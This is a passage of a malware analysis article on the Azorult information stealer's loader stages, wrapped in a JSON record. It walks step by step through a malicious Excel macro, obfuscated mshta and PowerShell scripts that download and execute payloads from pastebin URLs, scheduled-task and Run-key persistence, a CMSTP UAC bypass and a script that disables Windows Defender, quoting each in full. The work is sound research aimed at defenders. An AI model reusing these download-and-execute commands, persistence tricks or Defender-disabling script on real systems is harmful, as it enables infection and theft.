{
    "id": "41bf37e3-f85e-4811-9208-cd08d6a5ebc9",
    "created_at": "2023-01-12T14:59:44.144753Z",
    "updated_at": "2025-03-27T02:15:06.944143Z",
    "deleted_at": null,
    "sha1_hash": "c3b26468e0e3e5640f2bf6dc91af8d88fd0e0cd2",
    "title": "2020-03-26 - Azorult loader stages",
    "authors": "",
    "file_creation_date": "2022-05-28T03:50:39Z",
    "file_modification_date": "2022-05-28T03:50:39Z",
    "file_size": 222998,
    "plain_text": "# Azorult loader stages\n\n**[maxkersten.nl/binary-analysis-course/malware-analysis/azorult-loader-stages/](https://maxkersten.nl/binary-analysis-course/malware-analysis/azorult-loader-stages/)**\n\n#### This article was published on the 26th of March 2020. This article was updated on the 3rd of April 2020, on the 13th of April 2020, and on the 8th of December 2021.\n\n Azorult is an information stealer that steals passwords from installed applications, browser cookies, cryptocurrency wallets, arbitrary files, and more. In this article, the loading phase of the Azorult stealer is analysed in the usual step-by-step manner. These stages are written in multiple languages and contain several obfuscation methods, multiple files, a UAC bypass, and a process injection technique. Additionally, the loader keeps most files in-memory, which lowers the initial detection rate significantly.\n\n This sample is part of Gorgon group’s cluster one, as documented by Prevailion.\n\n## Table of contents\n\n Terminology\n\n#### While most of the files are kept in-memory, some of them are still stored on the disk. Some reports call this file-less, whilst others do not. In this article, the exact definition is left up to the reader.\n\n Aside from the above-mentioned, the execution is partly done via binaries that are already present on systems. These binaries are often called LoLBins, which is short for Living of the Land Binaries. LoLBins are used to perform certain actions, for which they are designed. As such, their features are used as expected, though with malicious intention. This campaign uses multiple LoLBins.\n\n## Sample information\n\n#### The sample, which is a ZIP folder that contains all stages separately, can be downloaded from VirusBay, Malware Bazaar, or MalShare. The hashes given below are for the malicious Excel workbook, which is the first stage.\n```\nMD5: 0f49e06aaab8816a9d95815e749fb291\nSHA-1: e124c99646e1d7fa682e465630eda2159172dcb1\nSHA-256: f5190d29af5ba58c45b138751593e2f5ed014d42e5c37f05f6ea98ee8838c9e2\nSize: 37376 bytes\n\n I’d like to thank Itay ‘Megabeets’ Cohen for assisting me in finding the sample.\n\n## Stage 1 – The malicious macro\n\n```\n\n-----\n\n#### To view the macros within the Excel workbook, one can use olevba, which is part of the oletools suite. To install the tools, one has to run the following command:\n```\nsudo -H pip3 install -U oletools\n\n Note that the used pip has to correspond with the Python version that is on your system.\n\n To see what macros are in the first stage, simply run olevba with the Excel workbook as its sole parameter. The command is given below.\nolevba ./stage1-macro.xls\n\n When reviewing the macros, one has to look for the function that gets executed first. In this case, this function is named Workbook_BeforeClose. To evade detection, the macro in this Excel workbook does not execute directly when the document is opened, but rather when it is closed. Some sandboxes only open the document, which causes the verdict to come back as benign rather than malicious. Microsoft documented the function here. The macro is given below.\nSub Workbook_BeforeClose(Cancel As Boolean)\nShell \"ipconfig\"\nShell \"ipconfig\"\nSheet2.VVV\nShell \"ipconfig\"\nShell \"ipconfig\"\nEnd Sub\n\n The Shell function is used to run an executable program, as is stated in the documentation. The second parameter, which is used to set the window style of the program, is optional. If it is not included in the call, as is the case in this sample, the window style is set to minimised with focus.\n\n The ipconfig binary is used to print information about the connectivity of the machine. In this case, the outcome of the function call is lost. The only other function call in this function refers to Sheet2.VVV, without any arguments. This function is given below.\nSub VVV()\nShell \"ipconfig\"\nShell \"ipconfig\"\nCall Sheet1.VVV2\nShell \"ipconfig\"\nShell \"ipconfig\"\nEnd Sub\n\n```\n\n-----\n\n#### This function has a similar lay-out, although it calls to Sheet1.VVV2, which is given below.\n```\nSub VVV2()\nShell \"ipconfig\"\nSet omsvd = CreateObject(\"WScript.Shell\")\nomsvd.RegWrite \"H\" & \"K\" & \"C\" & \"U\" & \"\\\" & \"S\" & \"o\" & \"f\" & \"t\" & \"w\" & \"a\" &\n\"re\\M\" & \"i\" & \"c\" & \"r\" & \"o\" & \"s\" & \"o\" & \"f\" & \"t\" & \"\\\" & \"W\" & \"i\" & \"n\" & \"d\"\n& \"o\" & \"w\" & \"s\" & \"\\C\" & \"u\" & \"r\" & \"r\" & \"e\" & \"n\" & \"tVe\" & \"r\" & \"s\" & \"i\" &\n\"o\" & \"n\" & \"\\R\" & \"u\" & \"n\" & \"\\fgiopoiuytresdfgh\", \"\"\"m\" & \"s\" & \"h\" & \"t\" &\n\"a\"\"\"\"h\" & \"t\" & \"t\" & \"p\" & \":\" & \"\\\" & \"\\\" & \"j\" & \".\" & \"m\" & \"p\" & \"\\\" &\n\"fgiopoiuytresdfgh\"\"\", \"REG_SZ\"\nShell \"ipconfig\"\nEnd Sub\n\n This function creates a WScript.Shell object, which is then used to write a value to the registry. The strings are split per character. Below, the function is given with concatenated strings.\nSub VVV2()\nShell \"ipconfig\"\nSet omsvd = CreateObject(\"WScript.Shell\")\nomsvd.RegWrite\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\fgiopoiuytresdfgh\", \"mshta\nhttp:\\\\j.mp\\fgiopoiuytresdfgh\", \"REG_SZ\"\nShell \"ipconfig\"\nEnd Sub\n\n The used registry location contains all items that are executed when the system starts. In this case, the registry key named fgiopoiuytresdfgh contains mshta http:\\\\j.mp\\fgiopoiuytresdfgh. The Microsoft HTA executable (mshta) is present on all modern Windows systems, and is a LoLBin. It corrects the backwards slashes to forward slashes, thus validating the address. The third argument, REG_SZ defines the type of the value that is stored in the registry. Per Microsoft’s documentation, this type is a null-terminated ANSI or Unicode string.\n\n This function creates a persistence mechanism to execute the payload that is located at the given URL, which is the next stage.\n\n## Stage 2 – Persistence and more stages\n\n#### The URL that launches the second stage redirects towards https://pastebin.com/raw/N7bd8WVi. The script that is hosted there is escaped and obfuscated. First, the complete script will be unescaped and deobfuscated. After that, the script will be analysed.\n\n### Stage 2 – Unescaping and deobfuscation\n\n#### The escaped script is given below.\n\n```\n\n-----\n\n```\ndocument.write(unescape( %3Cscript%20language%3D%22%26%2386%3B%26%2366%3B%26%2383%3B%2\nnoexit%20%5BByte%5B%5D%5D%24sc64%3D%20iex%28iex%28%27%28%26%22%20+%20%22%28GCM%20*WO*%29%27+%20%27Net.%27+%22%20+%20%22%27WebC%27+%27l%22%20+%20%22ient%29%27+%27.Do%22%2\n\n#### One can unescape this script in the browser’s console, using the command that is given below. Note that the […] is a placeholder for the script, which is omitted due to brevity.\nconsole.log(unescape(\"[...]\"));\n\n The complete decoding command is given below.\nconsole.log(unescape(\"%3Cscript%20language%3D%22%26%2386%3B%26%2366%3B%26%2383%3B%26%2\nnoexit%20%5BByte%5B%5D%5D%24sc64%3D%20iex%28iex%28%27%28%26%22%20+%20%22%28GCM%20*WO*%29%27+%20%27Net.%27+%22%20+%20%22%27WebC%27+%27l%22%20+%20%22ient%29%27+%27.Do%22%2\n\n As a result, the console will print the unescaped script, which can then be copied into a text editor of choice. The unescaped script is given below.\nset nci = CreateObject(StrReverse(\"llehS.tpircSW\"))\nDim xx\nxx1 = \"r \"\"mshta http:\\\\pastebin.com\\raw\\wnacsSXn\"\" /F \"\nxx0 = StrReverse(\"t/ )+Dogad+( nt/ 07 om/ ETUNIM cs/ etaerc/ sksathcs\")\nnci.run xx0 + xx1, vbHide\nset Ixsi = CreateObject(StrReverse(\"llehS.tpircSW\"))\nDim Bik\nBik1 = \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\wnacsSXn\"\"\"\nIxsi.run Bik1, vbHide\nCreateObject(\"WScript.Shell\").RegWrite\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\", \"m\" + \"s\" + \"h\" + \"t\" + \"a\nhttp:\\\\pastebin.com\\raw\\ti3Ri0LR\", \"REG_SZ\"\nSet x_iw = CreateObject(\"W\" + \"S\" + \"c\" + \"r\" + \"i\" + \"p\" + \"t\" + \".\" + \"S\" + \"h\" +\n\"e\" + \"l\" + \"l\")\nx_iw.Run(\"P\" + \"o\" + \"w\" + \"e\" + \"r\" + \"s\" + \"h\" + \"e\" + \"l\" + \"l\" + \".\" + \"e\" + \"x\"\n+ \"e -noexit [Byte[]]$sc64= iex(iex('(&\" + \"(GCM *W-O*)'+ 'Net.'+\" + \"'WebC'+'l\" +\n\"ient)'+'.Do\" + \"w'+'nload'+'Str'+'ing(''htt\" + \"ps:\" + \"//\" + \"p\" + \"a\" + \"s\" + \"t\"\n+ \"ebin.com/raw/NRWPsuFT'').repl\" + \"ace(''#'',''^%$'').r\" + \"e\" + \"p\" + \"l\" + \"a\" +\n\"c\" + \"e\" + \"(''^%$'',''0x'')'));[<##>\" + \"Ap\" + \"pDomain<##>]::<##>('(\" + \"&$@#$%^&*\n(urrent\" + \"Domain'.rep\" + \"lace('(&$@#$%^&*(','C'))<##>.<##>('%\" +\n\"*&^*&^*&^*&^*&oad'.r\" + \"eplace('%\" + \"*&^*&^*&^\" + \"*&^*&\" + \"','L'))(\" +\n\"$sc64).'EntryP\" + \"oint'<##>.<##>('in*&^*\" + \"&^*&^&*^*&^o\" + \"k))*()*)(**(&(*&'.r\"\n+ \"e\" + \"p\" + \"l\" + \"a\" + \"c\" + \"e\" + \"('))*()*)(**\" + \"(&(*&','e').r\" + \"e\" + \"p\" +\n\"l\" + \"a\" + \"c\" + \"e\" + \"('*&^\" + \"*&^*&^&*^*&^','v'))($null,$null)\"),0\nself.close\n\n The script is obfuscated in several ways. One way to avoid detection, is to reverse strings. In this case, the StrReverse function is used to revert the strings back to their original value. An example is given below.\nStrReverse(\"llehS.tpircSW\")\n\n```\n\n-----\n\n#### Additionally, string concatenation is used to avoid detection. An example of string concatenation is given below.\n```\n\"W\" + \"S\" + \"c\" + \"r\" + \"i\" + \"p\" + \"t\" + \".\" + \"S\" + \"h\" + \"e\" + \"l\" + \"l\"\n\n Once both are removed, the script becomes easily readable, as can be seen below.\nset nci = CreateObject(\"WScript.Shell\")\nDim xx\nxx1 = \"r \"\"mshta http:\\\\pastebin.com\\raw\\wnacsSXn\"\" /F \"\nxx0 = \"schtasks /create /sc MINUTE /mo 70 /tn (+dagoD+) /t\"\nnci.run xx0 + xx1, vbHide\nset Ixsi = CreateObject(\"WScript.Shell\")\nDim Bik\nBik1 = \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\wnacsSXn\"\"\"\nIxsi.run Bik1, vbHide\nCreateObject(\"WScript.Shell\").RegWrite\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\", \"mshta\nhttp:\\\\pastebin.com\\raw\\ti3Ri0LR\", \"REG_SZ\"\nSet x_iw = CreateObject(\"WScript.Shell\")\nx_iw.Run(\"Powershell.exe -noexit [Byte[]]$sc64= iex(iex('(&(GCM *W-O*)'+\n'Net.WebClient).DownloadString(''https://pastebin.com/raw/NRWPsuFT'').replace(''#'',''\n[<##>AppDomain<##>]::<##>('(&$@#$%^&*(urrentDomain'.replace('(&$@#$%^&*(','C'))<##>.\n<##>('%*&^*&^*&^*&^*&oad'.replace('%*&^*&^*&^*&^*&','L'))($sc64).'EntryPoint'<##>.\n<##>('in*&^*&^*&^&*^*&^ok))*()*)(**(&(*&'.replace('))*()*)(**(&\n(*&','e').replace('*&^*&^*&^&*^*&^','v'))($null,$null)\"),0\nself.close\n\n The bottom part of the script still contains several string replacement calls. Below, excerpts from the script are given, together with an explanation.\n.replace(''#'',''^%$'').replace(''^%$'',''0x'')\n\n The main purpose of these two chained replacement calls, is to replace the # character into 0x. As such, this can be simplified into a single replace call, as is given below.\n.replace(''#'',''0x'')\n\n Redundant calls are often added to confuse antivirus suites and researchers.\n\n The following two strings are only missing the first character. This causes existing rules that match on full words to fail.\n'(&$@#$%^&*(urrentDomain'.replace('(&$@#$%^&*(','C')\n'%*&^*&^*&^*&^*&oad'.replace('%*&^*&^*&^*&^*&','L')\n\n Their values are CurrentDomain and Load respectively.\n\n```\n\n-----\n\n#### The last string is only obtained after two string replace calls, and uses a trick to confuse text editors that highlight brackets, as well as analysts who look at the code: the string to be replaced contains an opening bracket. Since it is a part of the string, there is no need for a closing bracket. Text editors will expect the next closing bracket to be part of it, which can cause syntax highlighting to malfunction.\n```\n'in*&^*&^*&^&*^*&^ok))*()*)(**(&(*&'.replace('))*()*)(**(&\n(*&','e').replace('*&^*&^*&^&*^*&^','v')\n\n The string’s value is invoke.\n\n Lastly, a the Get-Command, abbreviated with GCM, is used to obscure a part of the script. This cmdlet lists all commands that are installed on the machine, and allows the use of wildcards. The command GCM *W-O* is used in the script. The result of the command is given below.\nPS C:\\Users\\user> GCM *W-O*\nCommandType   Name                        Version  Source\nCmdlet     New-Object                     3.1.0.0\n\n The result of removing all the unnecessary code is a clean script, as can be seen below.\nset nci = CreateObject(\"WScript.Shell\")\nDim xx\nxx1 = \"r \"\"mshta http:\\\\pastebin.com\\raw\\wnacsSXn\"\" /F \"\nxx0 = \"schtasks /create /sc MINUTE /mo 70 /tn (+dagoD+) /t\"\nnci.run xx0 + xx1, vbHide\nset Ixsi = CreateObject(\"WScript.Shell\")\nDim Bik\nBik1 = \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\wnacsSXn\"\"\"\nIxsi.run Bik1, vbHide\nCreateObject(\"WScript.Shell\").RegWrite\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\", \"mshta\nhttp:\\\\pastebin.com\\raw\\ti3Ri0LR\", \"REG_SZ\"\nSet x_iw = CreateObject(\"WScript.Shell\")\nx_iw.Run(\"Powershell.exe -noexit [Byte[]]$sc64= iex(iex('New-Object\nNet.WebClient).DownloadString(''https://pastebin.com/raw/NRWPsuFT'').replace(''#'',''0\n[<##>AppDomain<##>]::<##>('CurrentDomain)<##>.<##>('Load')($sc64).'EntryPoint'<##>.\n<##>('invoke')($null,$null)\"),0\nself.close\n\n### Stage 2 – Script analysis\n\n#### The script is made up out of four blocks of code, which all serve a different purpose. In this section, all four blocks will be analysed step-by-step.\n\n Block 1 – Scheduling a task\n\n```\n\n-----\n\n#### The first block of code uses schtasks, which is present on all modern Windows systems. As such, it is a LoLBin. This tool, short for scheduled tasks, does what its name suggest: it schedules tasks that are executed in the future. The code of the first block is given below.\n```\nset nci = CreateObject(\"WScript.Shell\")\nDim xx\nxx1 = \"r \"\"mshta http:\\\\pastebin.com\\raw\\wnacsSXn\"\" /F \"\nxx0 = \"schtasks /create /sc MINUTE /mo 70 /tn (+dagoD+) /t\"\nnci.run xx0 + xx1, vbHide\n\n A WScript Shell object is instantiated, which then used to execute the concatenated value of xx0 and xx1. The window style of the executed command is set to hidden using vbHide. The concatenated value is given below.\nschtasks /create /sc MINUTE /mo 70 /tn (+dagoD+) /tr \"mshta\nhttp:\\\\pastebin.com\\raw\\wnacsSXn\" /F\n\n The /create flag is used to create a new task. The /sc flag is short for schedule, which requires the interval type. In this case, the interval is specified in minutes. The interval value is set using /mo, which is short for modifier. The task name is set using /tn. The task to run is set using /tr. At last, the /F is used to forcefully create the task and suppress any warning that might come up.\n\n The task that is scheduled calls out to the given address using mshta every 70 minutes, and is named (+dagoD+). as mentioned before, the mshta binary is a LoLBin. The given address is the third stage of the loader.\n\n Block 2 – Script execution\n\n The second block of code in the script is very similar to the first block. It simply executes the next stage, as can be seen below.\nset Ixsi = CreateObject(\"WScript.Shell\")\nDim Bik\nBik1 = \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\wnacsSXn\"\"\"\nIxsi.run Bik1, vbHide\n\n The third stage is executed using a WScript Shell and within a hidden window. This block ensures that the execution happens directly. After that, the third stage is executed via the scheduled task every 70 minutes.\n\n Block 3 – More persistence\n\n The third block adds a new value to the registry key, thereby persisting the call to a specific URL using mshta every time the machine starts. The code is given below.\nCreateObject(\"WScript.Shell\").RegWrite\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\", \"mshta\nhttp:\\\\pastebin.com\\raw\\ti3Ri0LR\", \"REG_SZ\"\n\n```\n\n-----\n\n#### The content that resides at the given URL is an empty template script for the WScript Shell. The template is given below.\n```\nself.close\n\n Pastes on Pastebin can be edited. As such, the reoccurring call to this script can be used to execute a different script in the future.\n\n Block 4 – PowerShell execution\n\n The last block of code in this script executes PowerShell code via the WScript Shell. The PowerShell script uses a part of the Dot Net Framework to download a string. The code is given below.\nSet x_iw = CreateObject(\"WScript.Shell\")\nx_iw.Run(\"Powershell.exe -noexit [Byte[]]$sc64= iex(iex('New-Object\nNet.WebClient).DownloadString(''https://pastebin.com/raw/NRWPsuFT'').replace(''#'',''0\n[<##>AppDomain<##>]::<##>('CurrentDomain)<##>.<##>('Load')($sc64).'EntryPoint'<##>.\n<##>('invoke')($null,$null)\"),0\nself.close\n\n The script that is downloaded, is altered using the replace which makes it a byte array. After that, the byte array is loaded into the current domain and executed without any additional arguments. This binary file is the fourth stage.\n\n## Stage 3 – Loading the Azorult loader\n\n#### This script is escaped, similar to previous one. The same method can be used to unescape the script. The escaped script is given below.\ndocument.write(unescape(\"%3Cscript%20language%3D%22%26%2386%3B%26%2366%3B%26%2383%3B%2\nconnection%20-comp%20google.com%20-count%201%20Quiet%7D%20until%20%28%24ping%29%3B%24p22%20%3D%20%5BEnum%5D%3A%3AToObject%28%5BSystem\nObject%20Com%20Microsoft.XMLHTTP%3B%24t.open%28%27GET%27%2C%27h%22%20+%20%22t%22%20+%20%22t%22%\nO*%29%27+%20%27Net.%27+%27WebC%27+%27lient%29%27+%27.Dow%27+%27nload%27+%27Str%27+%27i\n\n The unescaped script is given below.\n\n```\n\n-----\n\n```\nSet mmn CreateObject(StrReverse(\\ llehS.tpircSW\\ ))\nllll = \\\"p\\\" + \\\"o\\\" + \\\"w\\\" + \\\"e\\\" + \\\"r\\\" + \\\"she\\\" + \\\"ll do {$ping = testconnection -comp google.com -count 1 -Quiet} until ($ping);$p22 =\n[Enum]::ToObject([System.Net.Secu\\\" + \\\"rityProtocolType], 3072);\n[System.Net.ServicePointManager]::SecurityProtocol = $p22;$t= New-Object -Com\nMicrosoft.XMLHTTP;$t.open('GET','h\\\" + \\\"t\\\" + \\\"t\\\" + \\\"p\\\" + \\\"s\\\" +\n\\\"://pastebin.com/raw/5sfgNap6',$false);$t.send();$ty=\n[Text.Encoding]::'UTF8'.'GetString'([Convert]::'FromBase64String'($t.responseText))|I`\n[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n'Net.'+'WebC'+'lient)'+'.Dow'+'nload'+'Str'+'ing(''https://pastebin.com/raw/82GQmFar''\n | g;$t=[System.Reflection.Assembly]::Load($decompressedByteArray);\n[Givara]::FreeDom('svchost.exe',$Cli2)\\\"\nmmn.Run llll, vbHide\nself.close\n\n#### The unescaped script contains string concatenation, reversed strings, a lack of new lines, Get-Command usage, and string replacement calls. As these techniques have been analysed in the second stage, their removal is not covered here. The cleaned script is given below.\nSet mmn = CreateObject(\"WScript.Shell\")\nllll = \"powershell do {$ping = test-connection -comp google.com -count 1 -Quiet}\nuntil ($ping);$p22 =[Enum]::ToObject([System.Net.SecurityProtocolType], 3072);\n[System.Net.ServicePointManager]::SecurityProtocol = $p22;$t= New-Object ComMicrosoft.XMLHTTP;$t.open('GET','https://pastebin.com/raw/5sfgNap6',$false);$t.send\n[Text.Encoding]::'UTF8'.'GetString'([Convert]::'FromBase64String'($t.responseText))|IE\n[Byte[]]$Cli2= iex(iex('(&(GCM *WO*)'+'Net.WebClient).DownloadString(''https://pastebin.com/raw/82GQmFar'').replace(''#\n | g;$t=[System.Reflection.Assembly]::Load($decompressedByteArray);\n[Givara]::FreeDom('svchost.exe',$Cli2)\"\nmmn.Run llll, vbHide\nself.close\n\n In this case, the WScript Shell is only used to execute PowerShell code. As such, the PowerShell code can be extracted from the script, together with new lines to make the code easily readable. The PowerShell excerpt is given below in four blocks.\n\n```\n\n-----\n\n```\ndo {\n  $ping = test-connection -comp google.com -count 1 -Quiet\n} until ($ping);\n$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);\n[System.Net.ServicePointManager]::SecurityProtocol = $p22;\n$t= New-Object -Com Microsoft.XMLHTTP;\n$t.open('GET','https://pastebin.com/raw/5sfgNap6',$false);\n$t.send();\n$ty=\n[Text.Encoding]::'UTF8'.'GetString'([Convert]::'FromBase64String'($t.responseText))|IE\n[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n'Net.WebClient).DownloadString(''https://pastebin.com/raw/82GQmFar'').replace(''#'',''\n | g;\n$t=[System.Reflection.Assembly]::Load($decompressedByteArray);\n[Givara]::FreeDom('svchost.exe',$Cli2)\n\n#### Each block will be analysed step-by-step.\n\n### Block 1 – Testing the internet connection\n\n#### The first block of code tests the internet connection quitely. This part of the script has two use cases. Firstly, it only continues when there is an internet connection. If there is none, the loop will continue until the condition is met. Secondly, it generates legitmate network traffic, which can confuse the behavioral scan that is conducted by antivirus products.\ndo {\n  $ping = test-connection -comp google.com -count 1 -Quiet\n} until ($ping);\n\n The used cmdlet is documented here by Microsoft.\n\n### Block 2 – Setting the security protocol\n\n#### The second block is used to set the security protocol, which is used in the third block. The enum value of 3072 refers to TLS 1.2. Windows supports this since Windows 7.\n$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);\n[System.Net.ServicePointManager]::SecurityProtocol = $p22;\n\n The value that is set in this block has an effect on all future calls within this script.\n\n### Block 3 – Loading more PowerShell code\n\n#### In this block, a HTTP request is made to download a base64 encoded script, as can be seen below.\n\n```\n\n-----\n\n```\n$t New Object Com Microsoft.XMLHTTP;\n$t.open('GET','https://pastebin.com/raw/5sfgNap6',$false);\n$t.send();\n$ty=\n[Text.Encoding]::'UTF8'.'GetString'([Convert]::'FromBase64String'($t.responseText))|IE\n\n#### Based on IEX, which is short for Invoke-Expression, one can deduce that the decoded script is also a PowerShell script. This script will be analysed in stage 5.\n\n### Block 4 – Executing an exported function\n\n#### The last block of code downloads yet another string, after which a string replacement call is made. The value is stored as a byte array.\n[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n'Net.WebClient).DownloadString(''https://pastebin.com/raw/82GQmFar'').replace(''#'',''\n | g;\n$t=[System.Reflection.Assembly]::Load($decompressedByteArray);\n[Givara]::FreeDom('svchost.exe',$Cli2)\n\n At last, a variable with an unknown content is loaded into memory, after which a function from an unknown class is called. The definition and initialisation of the missing data can only be present in the PowerShell script that is downloaded and executed in the third block. The newly created byte array is used as an argument. As such, this will also be covered in stage 5.\n\n## Stage 4 – Disabling Windows Defender\n\n#### This stage contains a single script, which is converted into a Dot Net binary, after which it is loaded into memory, from where it is executed. The command to download and save the binary is given below.\n[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n'Net.WebClient).DownloadString(''https://pastebin.com/raw/NRWPsuFT'').replace(''#'',''\n$Cli2 | Set-Content stage4.dll -Encoding Byte\n\n It pipes the variable $Cli2 into the Set-Content cmdlet, which is documented here. The encoding type is specified as Byte, as it is a binary file.\n\n Analysing a Dot Net binary can be done using dnSpy.\n\n This binary contains only a single class, which is named CMSTPBypass. Within this class, there are two external functions, both of which are given below.\n\n```\n\n-----\n\n```\n// Token: 0x06000001 RID: 1\n[DllImport(\"user32.dll\")]\npublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n// Token: 0x06000002 RID: 2\n[DllImport(\"user32.dll\", SetLastError = true)]\npublic static extern bool SetForegroundWindow(IntPtr hWnd);\n\n#### Additionally, two global variables are also declared and initialised, which are given below.\npublic static string InfData = \"\n[version]\\r\\nSignature=$chicago$\\r\\nAdvancedINF=2.5\\r\\n\\r\\n[DefaultInstall]\\r\\nCustomD\n Commands Here will be run Before Setup Begins to\ninstall\\r\\nREPLACE_COMMAND_LINE\\r\\ntaskkill /IM cmstp.exe\n/F\\r\\n\\r\\n[CustInstDestSectionAllUsers]\\r\\n49000,49001=AllUSer_LDIDSection,\n7\\r\\n\\r\\n[AllUSer_LDIDSection]\\r\\n\\\"HKLM\\\",\n\\\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE\\\",\n\\\"ProfileInstallPath\\\", \\\"%UnexpectedError%\\\",\n\\\"\\\"\\r\\n\\r\\n[Strings]\\r\\nServiceName=\\\"NyanCat\\\"\\r\\nShortSvcName=\\\"NyanCat\\\"\\r\\n\\r\\n\";\npublic static string BinaryPath = \"c:\\\\windows\\\\system32\\\\cmstp.exe\";\n\n The main function of the program, which is where the exeuction starts, is given below in full. After that, the function is analysed in smaller bits.\n\n```\n\n-----\n\n```\n// Token: 0x06000004 RID: 4 RVA: 0x000020F4 File Offset: 0x000002F4\npublic static void Main()\n{\n  try\n  {\n    string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) +\n\"\\\\temp\\\\\" + Path.GetRandomFileName().Split(new char[]\n    {\n      Convert.ToChar(\".\")\n    })[0] + \".vbs\";\n    File.WriteAllBytes(text, CMSTPBypass.GetResource(\"31u5mzgjiv4\"));\n    StringBuilder stringBuilder = new StringBuilder();\n    stringBuilder.Append(CMSTPBypass.SetInfFile(\"cmd /c start \\\"\" + text +\n\"\\\"\"));\n    Process.Start(new ProcessStartInfo(CMSTPBypass.BinaryPath)\n    {\n      Arguments = \"/au \" + stringBuilder.ToString(),\n      UseShellExecute = false,\n      CreateNoWindow = true,\n      WindowStyle = ProcessWindowStyle.Hidden\n    });\n    IntPtr value = 0;\n    value = IntPtr.Zero;\n    do\n    {\n      value = CMSTPBypass.SetWindowActive(\"cmstp\");\n    }\n    while (value == IntPtr.Zero);\n    SendKeys.SendWait(\"{ENTER}\");\n  }\n  catch\n  {\n  }\n  Environment.Exit(0);\n}\n\n#### As can be observed in the code above, the original names are still present in the code. There is no obfuscation present either. The first part of the code is given below.\nstring text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) +\n\"\\\\temp\\\\\" + Path.GetRandomFileName().Split(new char[]\n    {\n      Convert.ToChar(\".\")\n    })[0] + \".vbs\";\nFile.WriteAllBytes(text, CMSTPBypass.GetResource(\"31u5mzgjiv4\"));\n\n In the code above, a path is created by concatenating the Windows folder to which \\temp\\ is appended. The Path.GetRandomFileName function, as documented here, generates a random file name including a random extension. By splitting the string at the dot, the file name and file extension are split. Index zero of the resulting array contains the file name, to which the VBScript extension is then appended. In short, assuming that Windows is installed on the C-drive, a file is created at C:\\Windows\\temp\\[randomName].vbs.\n\n```\n\n-----\n\n#### The second line creates a new file based on the given path. The content of the file is obtained using the GetResource function, which is given below.\n```\n// Token: 0x06000006 RID: 6 RVA: 0x00002254 File Offset: 0x00000454\nprivate static byte[] GetResource(string file)\n{\n  ResourceManager resourceManager = new ResourceManager(\"su5stfdsn0l\",\nAssembly.GetExecutingAssembly());\n  return (byte[])resourceManager.GetObject(file);\n}\n\n The resource manager is used to get load the file based on the given name. The script that is written to the disk, is given below.\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\n CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\n , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\n WScript.Quit\nEnd If\nOn Error Resume Next\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\nDefender\\DisableAntiSpyware\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableBehaviorMonitoring\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableOnAccessProtection\",\"0\",\"REG_DWORD\"\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time\nProtection\\DisableScanOnRealtimeEnable\",\"0\",\"REG_DWORD\"\nWScript.Sleep 100\noutputMessage(\"Set-MpPreference -DisableRealtimeMonitoring $true\")\noutputMessage(\"Set-MpPreference -DisableBehaviorMonitoring $true\")\noutputMessage(\"Set-MpPreference -DisableBlockAtFirstSeen $true\")\noutputMessage(\"Set-MpPreference -DisableIOAVProtection $true\")\noutputMessage(\"Set-MpPreference -DisableScriptScanning $true\")\noutputMessage(\"Set-MpPreference -SubmitSamplesConsent 2\")\noutputMessage(\"Set-MpPreference -MAPSReporting 0\")\noutputMessage(\"Set-MpPreference -HighThreatDefaultAction 6 -Force\")\noutputMessage(\"Set-MpPreference -ModerateThreatDefaultAction 6\")\noutputMessage(\"Set-MpPreference -LowThreatDefaultAction 6\")\noutputMessage(\"Set-MpPreference -SevereThreatDefaultAction 6\")\nSub outputMessage(byval args)\nOn Error Resume Next\nSet objShell = CreateObject(\"Wscript.shell\")\nobjShell.run(\"powershell \" + args), 0\nEnd Sub\n\n```\n\n-----\n\n#### The given script has to run with elevated permissions. If this isn t the case, it is launched again. This loop continues until the code is launched with elevated permissions. Once it runs with elevated permissions, Windows Defender will be disabled by altering several registry keys. Additionally, the Set-MpPreference cmdlet, which is documented here, is used to disable even more parts of Windows Defender.\n\n The next part of the code refers back to the VBScript that is given above, and calls the SetInfFile function. The code is given below.\n```\nStringBuilder stringBuilder = new StringBuilder();\nstringBuilder.Append(CMSTPBypass.SetInfFile(\"cmd /c start \\\"\" + text + \"\\\"\"));\n\n The stringBuilder variable is filled with the return value of the SetInfFile function, which requires a single parameter: CommandToExecute. The code of the function is given below.\n// Token: 0x06000003 RID: 3 RVA: 0x00002050 File Offset: 0x00000250\npublic static string SetInfFile(string CommandToExecute)\n{\n  string value = Path.GetRandomFileName().Split(new char[]\n  {\n    Convert.ToChar(\".\")\n  })[0];\n  string value2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) +\n\"\\\\temp\";\n  StringBuilder stringBuilder = new StringBuilder();\n  stringBuilder.Append(value2);\n  stringBuilder.Append(\"\\\\\");\n  stringBuilder.Append(value);\n  